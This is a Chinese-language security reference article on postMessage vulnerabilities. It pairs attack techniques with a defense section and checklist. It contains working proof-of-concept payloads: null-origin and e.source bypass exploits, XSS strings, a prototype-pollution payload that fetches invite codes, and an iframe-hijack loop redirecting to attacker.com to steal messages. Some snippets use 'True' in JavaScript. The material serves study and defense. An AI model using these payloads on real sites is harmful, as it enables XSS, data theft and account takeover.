---
attack_surface: [客户端利用, 认证/授权绕过, 注入类, 竞态/时序]
impact: [身份伪造, 权限提升, 信息泄露, 完整性破坏, 机密性破坏]
risk_level: 高
prerequisites:
  - JavaScript postMessage API 基础
  - 同源策略 (SOP) 理解
  - iframe / sandbox 机制认知
  - DOM Clobbering 基础
difficulty: 高级
related_techniques:
  - xss-cross-site-scripting
  - prototype-pollution
  - csrf-cross-site-request-forgery
  - xs-search
  - dom-clobbering
tools:
  - Chrome DevTools
  - postMessage-tracker (Browser Extension)
  - posta (Browser Extension)
  - v8-randomness-predictor
---

# PostMessage Vulnerabilities — 跨窗口通信攻击

> 关联文档：[XSS](../../Reflected%20Values/XSS/README.md) · [Prototype Pollution](../../Reflected%20Values/Prototype%20Pollution/README.md) · [CSRF](../Cross%20Site%20Request%20Forgery/README.md) · [XS-Search](../../../../Other%20Helpful%20Vulnerabilities/XS-Search/README.md)

---

# 0x01 背景与原理

## 1.1 postMessage API 基础

`postMessage` 是 HTML5 引入的跨窗口通信机制，允许不同来源（origin）的窗口/iframe 之间安全地传递数据。它广泛用于：

- 第三方登录弹窗（OAuth flow）与主页面通信
- 广告/分析 SDK 与宿主页面的双向数据交换
- 微前端架构中子应用与基座的消息路由
- 浏览器扩展 Content Script 与页面之间的桥接

**发送消息**：

```javascript
// targetWindow 可以是 iframe.contentWindow、window.opener、window.open() 返回值等
targetWindow.postMessage(message, targetOrigin, [transfer]);

// 通配符 * — 消息可被任意 origin 的窗口接收
window.postMessage('{"__proto__":{"isAdmin":True}}', '*')

// 限定 origin — 仅当目标窗口的 origin 匹配时才发送
window.postMessage('{"__proto__":{"isAdmin":True}}', 'https://company.com')

// 向 iframe 发送（直接引用）
document.getElementById('idframe').contentWindow.postMessage('payload', '*')

// 向 iframe 发送（onload 回调）
<iframe src="https://victim.com/" onload="this.contentWindow.postMessage('<script>print()</script>','*')">

// 向 popup 发送
win = open('URL', 'hack', 'width=800,height=300,top=500');
win.postMessage('payload', '*')

// 向 popup 内部的 iframe 发送
win = open('URL-with-iframe-inside', 'hack', 'width=800,height=300,top=500');
// 循环等待 win.length == 1（iframe 加载完成）
win[0].postMessage('payload', '*')
```

**接收消息**：

```javascript
window.addEventListener(
  "message",
  (event) => {
    // ⚠️ 必须首先检查 origin！
    if (event.origin !== "http://example.org:8080") return

    // 处理 event.data
    // ...
  },
  false
)
```

## 1.2 核心风险

`postMessage` 本身不是漏洞，**不当的实现模式**才是。根因可归为四类：

| 根因类别 | 表现 | 后果 |
|---------|------|------|
| **wildcard targetOrigin** | `postMessage(data, '*')` | 消息可被任意 origin 窃听 |
| **缺失/弱 origin 校验** | 不检查 `event.origin` 或用 `indexOf`/`search` 做弱校验 | 任意页面可伪造消息 |
| **消息内容信任** | 直接使用 `event.data` 写入 DOM/执行 eval | XSS、Prototype Pollution |
| **存在可信 relay** | 同一 origin 下有 URL 参数反射到 postMessage 的端点 | origin 检查被绕过 |

---

# 0x02 攻击分类

- **攻击面**：客户端利用、认证/授权绕过、注入类、竞态/时序
- **影响维度**：身份伪造、权限提升、信息泄露、完整性破坏、机密性破坏
- **风险等级**：**高**（postMessage 几乎被每个现代 Web 应用使用，且 origin 校验常被忽视或错误实现）

| 攻击类型 | 利用方式 | 影响 | 关键前提 |
|---------|---------|------|---------|
| **Wildcard 窃听** | 修改 iframe 子页面 location 到攻击者域 | 信息泄露 | 通配符 `*` 发送敏感数据 |
| **Origin 检查绕过** | indexOf/search/match 正则陷阱、null origin | 权限提升、XSS | 弱 origin 校验逻辑 |
| **e.source 空化** | 发送后立即删除 iframe → `e.source === null` | 认证绕过 | 用 `==` 比较 source |
| **主线程阻塞竞态** | 同步阻塞父页面 + 向子 iframe 注入 payload | 信息泄露 | 父页面使用 `postMessage(secret, '*')` |
| **iframe location 劫持** | 嵌套 iframe 时修改子 iframe location | 信息窃取 | 外层的 X-Frame-Options 缺失 |
| **Prototype Pollution → XSS** | postMessage 发送 `__proto__` 污染服务端对象 | XSS/RCE | 消息数据被写入对象 |
| **Origin 衍生脚本加载** | 污染 origin 字段 → localStorage → 动态加载恶意脚本 | 账户接管 | event.origin 未被消毒即用于 URL 拼接 |
| **Math.random 预测** | 恢复 V8 PRNG 状态 → 预测回调 token → 伪造可信消息 | DOM XSS | callback token 由 Math.random() 生成 |
| **Partner XSS 中继** | 利用可信 origin 的 XSS 中继恶意消息 | 同源代码执行 | 可信 origin 存在 XSS 或可控 relay |

---

# 0x03 核心攻防技术

## 3.1 枚举与发现

### 3.1.1 监听器枚举

在目标页面中定位 postMessage 监听器：

**方法 1 — 搜索 JS 源码**：

```javascript
// 搜索关键字
window.addEventListener
$(window).on          // jQuery 版本
```

**方法 2 — Chrome DevTools Console**：

```javascript
getEventListeners(window)
// 返回对象，key 为事件名（message、popstate 等），value 为监听器数组
```

**方法 3 — Elements > Event Listeners 面板**：
Chrome DevTools Elements 标签页 → Event Listeners 子标签，勾选 "Ancestors" 和 "Framework listeners" 查看全部绑定。

**方法 4 — 浏览器扩展**：
- [postMessage-tracker](https://github.com/fransr/postMessage-tracker) — 拦截并展示所有 postMessage 通信
- [posta](https://github.com/benso-io/posta) — 类似功能，专用于 postMessage 调试

### 3.1.2 X-Frame-Header 绕过

当目标页面设置了 `X-Frame-Options: DENY` 无法被 iframe 嵌入时，使用 **popup 模式**：

```html
<script>
var w = window.open("<url>")
setTimeout(function(){ w.postMessage('text here','*'); }, 2000);
</script>
```

窗口打开的 popup 不受 `X-Frame-Options` 限制，`window.open()` 返回值就是目标窗口的引用。缺点是没有 iframe 隐蔽。

---

## 3.2 Origin 检查绕过

这是 PostMessage 安全中最关键的攻防面。

### 3.2.1 indexOf 绕过

```javascript
// 弱校验 — 可被绕过
"https://app-sj17.marketo.com".indexOf("https://app-sj17.ma")
// → 返回 0（匹配成功！）
```

攻击者只需注册 `app-sj17.ma` 前缀匹配的域名即可绕过。

### 3.2.2 search() 正则陷阱

```javascript
// search() 接受正则，. 在正则中匹配任意字符
"https://www.safedomain.com".search("www.s.fedomain.com")
// → 返回 8（匹配在位置 8，"safedomain" 中的 "s" + 任意字符 + "fedomain"）
```

`.` 作为正则通配符使域名前缀验证失效。

### 3.2.3 match() 类似风险

`String.prototype.match()` 同样将参数作为正则处理，不当使用会引入同样的绕过。

### 3.2.4 escapeHtml 不完全消毒

`escapeHtml` 函数覆盖现有对象属性而不创建新对象时，可被绕过：

```javascript
// 正常情况 — 转义生效
result = u({message: "'\"<b>\\"})
result.message // "&#39;&quot;&lt;b&gt;\"

// 绕过 — File 对象 bypass（name 属性只读不可覆盖）
result = u(new Error("'\"<b>\\"))
result.message // "'"<b>\"（未转义！）
```

`File` 对象的 `name` 属性是只读的，`escapeHtml` 无法通过覆写属性来消毒，导致 template 注入。

### 3.2.5 e.origin == window.origin — Null Origin 同源

当页面被嵌入 **sandboxed iframe** 时，`origin` 变为 `null`。

```html
<iframe sandbox="allow-scripts" src="https://target.com/page"></iframe>
```

此时 `window.origin === null`。如果 sandbox 属性包含 `allow-popups`（但不含 `allow-popups-to-escape-sandbox`），打开的 popup 也会继承 `null` origin。

攻击效果：iframe（`null` origin）→ 打开 popup（`null` origin）→ postMessage → popup 内检查 `e.origin !== window.origin` → `null !== null` 为 `false` → **绕过通过**。

```html
<body>
  <script>
    f = document.createElement("iframe")
    f.sandbox = "allow-scripts allow-popups allow-top-navigation"

    const payload = `x=opener.top;opener.postMessage(1,'*');setTimeout(()=>{
      x.postMessage({type:'render',identifier,body:'<img/src/onerror=alert(1)>'},'*');
    },1000);`.replaceAll("\n", " ")

    f.srcdoc = `
    <h1>Click me!</h1>
    <script>
      onclick = e => {
        let w = open('https://target.com/vuln-page');
        onmessage = e => top.location = 'https://target.com/vuln-page';
        setTimeout(_ => {
          w.postMessage({type: "render", body: "<audio/src/onerror=\\"${payload}\\">"}, '*')
        }, 1000);
      };
    <\/script>
    `
    document.body.appendChild(f)
  </script>
</body>
```

**2025 年仍有效**：Chromium 在 sandbox 无 `allow-same-origin` 时，popup 锁定为攻击者控制的 null origin。如果 handler 用 `if (origin !== window.origin) return`，两者均为 `null` 则 `null !== null` 为 `false`，消息直接通过。

### 3.2.6 document.domain 松弛

`document.domain` 可以被设置为父域以放宽同源策略。如果目标页面设置了 `document.domain`，攻击者在同父域下的子域页面可以绕过部分 origin 检查。

---

## 3.3 e.source 旁路

### 3.3.1 Null Source 攻击

当 handler 用 `==`（宽松比较）校验 source 时：

```javascript
// 目标代码
if (e.source == window.calc.contentWindow && e.data.token == window.token) {
  // 写入 innerHTML → XSS
}
```

**绕过链**：

1. **DOM Clobbering** 使 `window.calc.contentWindow` 变为 `undefined`：

```html
<!-- 使用 <img name=getElementById> 覆写 document.getElementById -->
<form name=getElementById id=calc>
```

这样 `document.getElementById("calc")` 不再返回元素，`window.calc` 为 `undefined`。

2. **发送后删除 iframe** 使 `e.source` 变为 `null`：

```javascript
let iframe = document.createElement("iframe")
document.body.appendChild(iframe)
window.target = window.open("http://localhost:8080/")
await new Promise((r) => setTimeout(r, 2000))
iframe.contentWindow.eval(`window.parent.target.postMessage("A", "*")`)
document.body.removeChild(iframe) // ← e.source === null
```

3. **null == undefined** → `true`，第一项检查绕过。

4. 发送 `token: null`，访问 `document.cookie` 在 null origin 页面触发错误 → `window.token` 变为 `undefined` → **`null == undefined`** → `true`，第二项检查也绕过。

5. 注入 `innerHTML` payload → **XSS**。

### 3.3.2 CVE-2024-49038 模式

```javascript
const probe = document.createElement('iframe');
probe.sandbox = 'allow-scripts';
probe.onload = () => {
  const victim = open('https://target-app/');
  setTimeout(() => {
    probe.contentWindow.postMessage(payload, '*');
    probe.remove();  // ← e.source → null
  }, 500);
};
document.body.appendChild(probe);
```

结合 DOM Clobbering，当接收端只看 `event.source === null`，与 `window.calc.contentWindow` 的 `undefined` 比较 → `null == undefined` → 通过。

---

## 3.4 Wildcard targetOrigin 攻击

### 3.4.1 修改子 iframe location 窃取消息

> 实战案例详解：[Google VRP — Hijacking Google Docs Screenshots](Google%20VRP%20Case%20Study%20-%20Hijacking%20Google%20Docs%20Screenshots.md)

**前提**：父页面可被 iframe（无 X-Frame-Options），父页面含子 iframe，父用 wildcard 向子 iframe 发送敏感消息。

```html
<html>
  <iframe src="https://docs.google.com/document/ID" />
  <script>
    setTimeout(exp, 6000);
    function exp(){
      // 每 100ms 尝试修改子 iframe 的 location
      // 需要持续轮询是因为目标 iframe 可能在页面加载时不存在（动态创建）
      setInterval(function(){
        window.frames[0].frame[0][2].location="https://attacker.com/exploit.html";
      }, 100);
    }
  </script>
</html>
```

攻击流：`window.frames[0]`（主 iframe）→ `frame[0][2]`（孙子 iframe）→ 将 location 改为攻击者控制页面 → 攻击者页面的 `onmessage` 接收 wildcard 发出的敏感消息。

**必须持续轮询的原因**：目标 iframe 往往不是页面加载时就存在的——例如 Google Docs 的反馈 iframe 只在用户点击 "Send Feedback" 后才被动态创建。因此需要 `setInterval(100ms)` 不断尝试修改一个**可能尚不存在**的 iframe，一旦创建即在下一个轮询周期被捕获。

### 3.4.2 wildcard vs specific targetOrigin：同一功能中的不对等防护

Google Docs 案例揭示了一个关键模式：**同一个应用中，不同通信路径使用了不同等级的 targetOrigin 保护**。

```
[docs.google.com]
  │ postMessage(像素RGB值)
  ↓
[www.google.com] ← iframe 1
  │ postMessage(RGB值, "https://feedback.googleusercontent.com")  ← 精确 targetOrigin ✅
  ↓
[feedback.googleusercontent.com] ← iframe 2 (渲染层)
  │ postMessage(base64, "https://www.google.com")                 ← 精确 targetOrigin ✅
  ↓
[www.google.com]
  │ postMessage(截图+描述, "*")                                    ← WILDCARD ❌
  ↓
提交窗口
```

当攻击者尝试替换 iframe 2（渲染层）时——**失败**，因为 `www.google.com` 向渲染层发消息时 targetOrigin 精确匹配 `feedback.googleusercontent.com`，浏览器在发送前校验 origin 不匹配，拒绝发送。

当攻击者改为替换提交窗口时——**成功**，因为最终提交用了 `"*"` wildcard，浏览器不校验目标 origin。

**核心教训**：`targetOrigin` 是**发送方的防线**，与接收方的 `event.origin` 检查是独立的。两者互补且同等重要。攻击者只需要找到一条使用了 wildcard 的通信路径。

### 3.4.3 注意事项

- 通配符 `*` 是攻击前提 — 如果 targetOrigin 指定了具体 URL 则此攻击无效
- 需要目标页面可被 iframe（无 `X-Frame-Options: DENY` 或 `frame-ancestors` CSP）
- 即使外层有 X-Frame-Options，popup 变体（`window.open()`）仍可使用
- 需要通过 DevTools frame tree 或枚举确定正确的嵌套索引路径（如 `frames[0].frame[0][2]`）

---

## 3.5 主线程阻塞竞态 — 在敏感消息发送前劫持子 iframe

来自 Terjanq 和 Postviewer 挑战的核心技术。

### 3.5.1 攻击原理

```
[正常流]
  parent: 创建 child iframe → load 事件 → postMessage(secret, '*') 到 child
  child:  onmessage → 处理 secret

[攻击流]
  parent: 创建 child iframe → load 事件 → [被阻塞] → postMessage(secret, '*')
  child:  在 parent 被阻塞期间：加载攻击者 JS → 注册 onmessage → 就绪
  parent: [恢复] → postMessage(secret, '*') → child: onmessage(secret) → 外传
```

关键：利用单线程 JS 特性，用**同步阻塞 gadget** 暂停父页面的事件循环，为子 iframe 争取注册 listener 的时间窗口。

### 3.5.2 Blocking Gadgets

**类型 1 — `==` 强制类型转换**：

```javascript
// 父页面 handler
window.addEventListener("message", (e) => {
  if (e.data == "blob loaded") {  // ← == 触发代价高昂的类型转换
    $("#previewModal").modal()
  }
})

// 攻击者发送大 Uint8Array → 父页面在 == 比较中耗时转换
const buffer = new Uint8Array(1e7)
victim.postMessage(buffer, "*", [buffer.buffer])
```

**类型 2 — 循环可控变量**：

```javascript
window.onmessage = (e) => {
  if (e.data.type === "share") {
    for (let i = 0; i < e.data.files.length; i++) { /* 耗时 */ }
  }
  if (e.data.slow) {
    for (let i = 0; i < e.data.slow; i++) {}  // ← 由攻击者控制长度
  }
}
```

### 3.5.3 竞态时间窗口优化

- 轮询 `win.length === 1` / `frames.length > 0` 确认子 iframe 存在
- 复用单个 popup/window 减少导航抖动
- 微调 `setTimeout` 延迟（经验值，取决于目标浏览器/硬件）
- 如果目标用 wildcard `postMessage(..., '*')`，持续发送直到确认子 iframe payload 已安装

### 3.5.4 Popup 变体（目标不可 iframe 时）

```html
<script>
setTimeout(() => {
  location = URL.createObjectURL(
    new Blob([document.documentElement.innerHTML], { type: "text/html" })
  )
}, 150)
</script>
```

1. 在 popup 打开目标页面
2. 构造自刷新 payload 文档（持续触发 onload）
3. 渲染第二个 payload 安装 onmessage
4. 阻塞 opener 页面 → 敏感消息在目标清理 listener 前被窃取

---

## 3.6 Trusted Origin Relay 滥用

### 3.6.1 Origin-only 信任模式

当 handler **只检查** `event.origin`（如信任 `*.trusted.com`）时，查找同一可信 origin 下的 **relay 端点**。

**Relay 特征**：
- 接收 URL 参数
- 通过 `postMessage` 将参数内容转发到 `opener`/`parent`
- 常用于营销预览、登录弹窗、OAuth 错误页等

**攻击流**：
1. 在 popup/iframe 中打开目标页面（让它的 postMessage handler 注册）
2. 将攻击者控制的另一窗口导航到可信 origin 的 relay 端点
3. Relay 以**可信 origin**的身份转发攻击者可控字段
4. Origin-only 验证通过 → 触发特权操作

### 3.6.2 实际案例 — Facebook Pixel Events SDK

Analytics SDK（如 fbevents）的典型模式：

```javascript
// SDK 监听 message，只检查特定 msg_type
window.addEventListener("message", (event) => {
  if (event.data.msg_type === "FACEBOOK_IWL_BOOTSTRAP") {
    // 使用消息中的 token 调用后端 API
    // 并在请求体中包含 location.href / document.referrer
  }
})
```

攻击者提供自己的 token，后端 API 请求记录到 token 所有者的日志中 → **从日志中读取 OAuth code/token**（这些值在 URL/referrer 中）。

---

## 3.7 Origin 衍生脚本加载 — CAPIG 案例

来自 Meta Conversions API Gateway（`capig-events.js`）的真实案例。

### 3.7.1 漏洞机制

```javascript
if (window.opener) {
  window.addEventListener("message", (event) => {
    if (
      !localStorage.getItem("AHP_IWL_CONFIG_STORAGE_KEY") &&
      event.data.msg_type === "IWL_BOOTSTRAP" &&
      checkInList(g.pixels, event.data.pixel_id) !== -1
    ) {
      localStorage.setItem("AHP_IWL_CONFIG_STORAGE_KEY", {
        pixelID: event.data.pixel_id,
        host: event.origin,           // ← 攻击者控制的 origin 被存储
        sessionStartTime: event.data.session_start_time,
      })
      startIWL() // 加载 ${host}/sdk/${pixel_id}/iwl.js
    }
  })
}
```

**攻击链**：
1. 获取 opener（如 Facebook Android WebView 中通过 `window.name` 复用）→ handler 注册
2. 从任意 origin 发送 `IWL_BOOTSTRAP` → `host = event.origin` 被写入 localStorage
3. 在 CSP 白名单域名上托管 `/sdk/<pixel_id>/iwl.js`
4. `startIWL()` 加载攻击者脚本 → **在 `www.meta.com` 上下文中执行** → credentialed 跨域请求 → 账户接管

### 3.7.2 后端生成共享脚本 → Stored XSS

插件 `AHPixelIWLParametersPlugin` 将用户规则参数拼接到 JS 中：

```javascript
// 注入闭合序列，如 "]}"
cbq.config.set("pixel_rules", "...<attacker_breakout>]}")
```

攻击者的规则参数突破 JSON 边界，注入任意 JS → 所有加载该共享脚本的站点均受影响（Stored XSS）。

---

## 3.8 Trusted-origin Allowlist 不是安全边界

```javascript
// 父页面（可信页面）
window.addEventListener("message", (e) => {
  if (e.origin !== "https://partner.com") return
  const [type, html] = e.data.split("|")
  if (type === "Partner.learnMore") target.innerHTML = html // ← DOM XSS
})
```

**攻击模式**：

1. 在 partner iframe 中找到 XSS → 植入 relay gadget：

```html
<img src="" onerror="onmessage=(e)=>{eval(e.data.cmd)};">
```

2. 从攻击者页面向被攻陷的 iframe 发送 JS，转发允许的消息类型到父页面：

```javascript
postMessage({
  cmd: `top.frames[1].postMessage('Partner.learnMore|<img src="" onerror="alert(document.domain)">|b|c', '*')`
}, "*")
```

3. 父页面收到来自 `partner.com` origin 的消息 → origin 检查通过 → `innerHTML` 注入 → **在父页面 origin 中执行 JS**。

**核心教训**：
- Partner origin 不是安全边界 — 任何 XSS 都成为进入父页面的桥梁
- 渲染 partner 控制内容的 handler（`innerHTML` 型 message type）使 partner 攻陷等价于同源 DOM XSS
- 宽泛的 message 类型表面增加 pivot 的 gadget 数量

---

## 3.9 Math.random() 回调 Token 预测

当 postMessage 网桥使用 `Math.random()` 生成 "共享密钥" 进行消息验证时：

```javascript
function guid() {
  return "f" + (Math.random() * (1<<30)).toString(16).replace(".", "")
}
```

### 3.9.1 攻击链（5 步）

**Step 1 — 通过 `window.name` 泄露 PRNG 输出**：
SDK 用 `guid()` 自动命名插件 iframe。攻击者 iframe 目标页面后导航插件子 iframe 到攻击者 origin，读取 `window.name` 获取原始 `Math.random()` 输出。

**Step 2 — 在不重载的情况下获取更多输出**：
发送 `init:post` 消息触发 `XFBML.parse()` → 销毁并重建插件 iframe → 生成新 name → 重复获取。

**Step 3 — 使用 Z3 求解器预测 V8 PRNG**：
将泄露的 iframe name 转换为 `[0,1)` 浮点数，输入 [V8 Math.random 预测器](https://github.com/PwnFunction/v8-randomness-predictor)，还原 PRNG 内部状态。

**Step 4 — 伪造可信 origin 回传**：
利用参数污染，通过可信 endpoint 反射恶意 payload：

```
/plugins/feedback.php?...%23relation=parent.parent.frames[0]%26cb=PAYLOAD%26origin=TARGET
```

**Step 5 — 触发 sink**：
构造 postMessage 数据使网桥分发 `xd.mpn.setupIconIframe`，在 `iconSVG` 中注入 HTML：

```javascript
const callback = "f" + (predictedFloat * (1 << 30)).toString(16).replace(".", "")
const payload =
  callback +
  "&type=mpn.setupIconIframe&frameName=x" +
  "&iconSVG=%3cimg%20src%3dx%20onerror%3dalert(document.domain)%3e"

const fbMsg = `https://www.facebook.com/plugins/feedback.php?...%26cb=${encodeURIComponent(payload)}%26origin=https://www.facebook.com`
iframe.location = fbMsg // ← 从 facebook.com origin 发起，携带伪造 callback
```

---

# 0x04 PostMessage → Prototype Pollution → XSS

当通过 `postMessage` 发送的数据被 JS 直接使用（如 `Object.assign`、扩展运算符）且不经过 sanitization：

```html
<html>
  <body>
    <iframe id="idframe" src="http://127.0.0.1:21501/snippets/demo-3/embed"></iframe>
    <script>
      function get_code() {
        document.getElementById("iframe_victim").contentWindow.postMessage(
          '{"__proto__":{"editedbymod":{"username":"<img src=x onerror=\\"fetch(\'http://127.0.0.1:21501/api/invitecodes\', {credentials: \'same-origin\'}).then(response => response.json()).then(data => {alert(data[\'result\'][0][\'code\']);})\\" />"}}}',
          "*"
        )
        document.getElementById("iframe_victim").contentWindow.postMessage(JSON.stringify("refresh"), "*")
      }
      setTimeout(get_code, 2000)
    </script>
  </body>
</html>
```

**机制**：
1. 发送 `__proto__` 污染 payload 修改 `Object.prototype.editedbymod.username`
2. 触发刷新 → 页面读取 `editedbymod.username` 时从原型链获取攻击者注入值
3. 值中包含 XSS payload → 渲染时触发

**联动关系**：

```
postMessage(PP payload, '*') → iframe 内 JS 合并对象 → Object.prototype 污染
  → 读取原型属性 → 攻击者控制的 HTML → innerHTML → XSS
```

---

# 0x05 攻击链与联动

## 5.1 postMessage → Null Origin Bypass → XSS

```
[Sandboxed iframe with allow-popups]
  → 打开 popup (origin = null)
  → 向 popup 发送 XSS payload via postMessage
  → popup handler 检查 e.origin !== window.origin → null !== null → false (绕过!)
  → XSS payload 注入 innerHTML → 代码执行
```

## 5.2 postMessage → DOM Clobbering → Source Nullification → XSS

```
[DOM Clobbering: <img name=getElementById>]
  → window.calc 变为 undefined
  → [创建 iframe → postMessage → 删除 iframe]
  → e.source === null, null == undefined → 检查绕过
  → 发送 token: null, window.token 因 cookie 错误变为 undefined
  → null == undefined → 双重绕过
  → innerHTML XSS
```

## 5.3 postMessage → Origin Spoofing → Script Loading → Account Takeover

```
[获取 opener] → 注册 message handler
  → 发送 IWL_BOOTSTRAP（任意 origin）
  → localStorage[host] = event.origin（攻击者控制）
  → startIWL() → 加载攻击者主机上的 /sdk/<id>/iwl.js
  → 在 www.meta.com origin 执行任意 JS
  → credentialed 请求 → 账户接管
```

## 5.4 postMessage → Trusted Relay → Partner XSS → Parent Code Exec

```
[Partner iframe XSS] → 植入 eval(e.data.cmd) relay
  → [Attacker page] → postMessage cmd 到 partner iframe
  → partner iframe 转发 Partner.learnMore 消息到父页面
  → 父页面 origin 检查通过（partner.com）
  → innerHTML 注入 → 父页面同源代码执行
```

## 5.5 postMessage → Race Condition → Message Interception

```
[父页面创建 child iframe]
  → [攻击者发送同步阻塞 payload 到父页面]
  → 父页面事件循环停滞
  → [子 iframe 在此期间加载攻击者 JS → 注册 onmessage]
  → 父页面恢复 → postMessage(secret, '*')
  → 攻击者 onmessage 接收 → 外传 secret
```

---

# 0x06 防御策略

## 6.1 发送端

| 措施 | 说明 |
|------|------|
| **禁止 wildcard targetOrigin** | 永远使用具体的 origin，不用 `'*'` |
| **避免 postMessage 发送敏感数据** | Token、密码、secret 不通过 postMessage 传递 |
| **使用 transfer list** | 发送大对象时使用 transfer 减少内存复制 |

## 6.2 接收端

| 措施 | 说明 |
|------|------|
| **严格 origin 白名单** | 用 `===` 精确比较，不用 `indexOf`/`search`/`match` |
| **结构化校验 event.data** | 校验消息结构和字段类型，拒绝未知 message type |
| **消毒消息内容** | 写入 DOM 前用 DOMPurify |
| **避免宽松比较** | `===` 不用 `==`，检查 `event.source` 时特别重要 |
| **不依赖 null origin** | 显式拒绝 `null` origin 消息 |
| **不信任 event.origin 做后续操作** | 不将 origin 用于 URL 拼接或 localStorage key |

## 6.3 架构层

| 措施 | 说明 |
|------|------|
| **CSP** | 限制脚本加载来源，防止 origin 衍生脚本注入 |
| **X-Frame-Options / CSP frame-ancestors** | 防止页面被攻击者 iframe |
| **COOP (Cross-Origin-Opener-Policy)** | 限制 opener 关系，减少 postMessage 攻击面 |
| **不再使用 Math.random() 做安全标记** | 使用 `crypto.getRandomValues()` 生成不可预测 token |

## 6.4 检测清单

- [ ] 所有 `postMessage` 调用是否使用了具体 targetOrigin？（而非 `'*'`）
- [ ] 所有 `message` handler 是否用 `===` 严格比较 origin？
- [ ] 是否拒绝了 `null` origin 消息？
- [ ] `event.data` 在写入 DOM 前是否经过 DOMPurify？
- [ ] 是否将 `event.origin` 用于后续信任决策（URL 拼接、localStorage）？
- [ ] 是否存在同 origin 下的 relay 端点转发用户控制参数？
- [ ] 页面是否可被 iframe？`X-Frame-Options` / CSP `frame-ancestors` 是否配置？
- [ ] 回调 token 是否由 `Math.random()` 生成？
- [ ] 是否存在 DOM Clobbering 风险（全局变量通过 `id` 属性被覆写）？

---

# 0x07 工具速查

| 工具 | 功能 | 链接 |
|------|------|------|
| **postMessage-tracker** | Chrome 扩展 — 拦截并记录所有 postMessage | [GitHub](https://github.com/fransr/postMessage-tracker) |
| **posta** | Chrome 扩展 — postMessage 调试 | [GitHub](https://github.com/benso-io/posta) |
| **v8-randomness-predictor** | V8 Math.random() 状态恢复（Z3 求解器） | [GitHub](https://github.com/PwnFunction/v8-randomness-predictor) |
| **eventlistener-xss-recon** | postMessage listener/XSS 练习靶场 | [GitHub](https://github.com/yavolo/eventlistener-xss-recon) |

---

# 0x08 参考案例与资料

## 真实漏洞案例

| 案例 | 类型 | 影响 |
|------|------|------|
| [Google VRP — Screenshot Hijacking](https://blog.geekycat.in/posts/hijacking-google-docs-screenshots/) | Wildcard + iframe location 劫持 | 窃取 Google Docs 截图 |
| [CAPIG XSS — Facebook Conversions API](https://ysamm.com/uncategorized/2025/01/13/capig-xss.html) | Origin 衍生脚本加载 + Stored XSS | www.meta.com 代码执行 |
| [Leaking fbevents — Instagram ATO](https://ysamm.com/uncategorized/2026/01/16/leaking-fbevents-ato.html) | Origin-only trust + relay 滥用 | OAuth code 窃取 → 账户接管 |
| [Facebook Payments Self-XSS](https://ysamm.com/uncategorized/2026/01/15/self-xss-facebook-payments.html) | Math.random token 预测 | 支付页面 DOM XSS |
| [Facebook SDK Math.random → XSS](https://ysamm.com/uncategorized/2026/01/17/math-random-facebook-sdk.html) | V8 PRNG 恢复 | 跨域脚本注入 |
| [CVE-2024-49038](https://instatunnel.my/blog/postmessage-vulnerabilities-when-cross-window-communication-goes-wrong) | e.source nullification + DOM Clobbering | innerHTML XSS |

## 通用参考

- [PortSwigger — WebSocket Security (含 PostMessage 章节)](https://portswigger.net/web-security/websockets)
- [DOM XSS via PostMessage (jlajara)](https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html)
- [How to Spot and Exploit PostMessage Vulnerabilities](https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd)
- [Terjanq — Winning RCs with Iframes (blocking race)](https://gist.github.com/terjanq/7c1a71b83db5e02253c218765f96a710)
- [Same Origin XSS Challenge (NDevTK + Terjanq)](https://github.com/terjanq/same-origin-xss)
- [SekaiCTF 2022 — Obligatory Calc (Strellic + Terjanq)](https://github.com/project-sekai-ctf/sekaictf-2022/tree/main/web/obligatory-calc)
- [V8 Math.random() Predictor (Z3-based)](https://github.com/PwnFunction/v8-randomness-predictor)
- [THM Write-up: Vulnerable Codes](https://fatsec.medium.com/thm-write-up-vulnerable-codes-9ea8fe8464f9)
